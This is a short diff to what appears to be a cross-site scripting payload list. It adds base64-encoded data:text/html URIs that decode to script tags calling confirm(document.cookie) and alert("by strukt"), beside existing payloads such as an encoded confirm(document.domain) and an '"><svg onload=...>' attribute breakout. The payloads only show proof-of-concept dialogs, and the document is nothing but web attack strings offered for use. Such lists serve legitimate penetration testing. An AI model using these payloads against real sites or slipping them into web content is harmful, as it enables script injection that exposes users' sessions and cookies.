@@ -2,7 +2,8 @@
 
 
 data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= //confirm(document.domain)
-
+data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4= //confirm(document.cookie)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert("by strukt")
 
 "><svg onload=confirm(domain)>
 
